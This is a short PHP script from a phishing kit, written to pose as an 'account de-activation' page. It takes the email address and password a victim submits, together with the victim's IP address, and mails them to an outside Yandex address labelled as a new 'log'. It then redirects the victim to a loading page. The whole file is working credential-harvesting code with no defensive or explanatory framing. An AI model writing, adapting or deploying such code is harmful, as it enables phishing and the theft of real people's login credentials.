<?
                                                                                                                                                              

          

                                                            
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Blessed Logz--------\n";
$message .= "Email-ID : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['pass']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "---------------Blessed Jboi-----------\n";
$send = "sch0olb0y@yandex.com";
$subject = "--New Log $ip -- Source:(Account De-activation)";


mail($send,$subject,$message,$headers);


$redirect = "loader.html";

header("Location: " . $redirect);
 
?>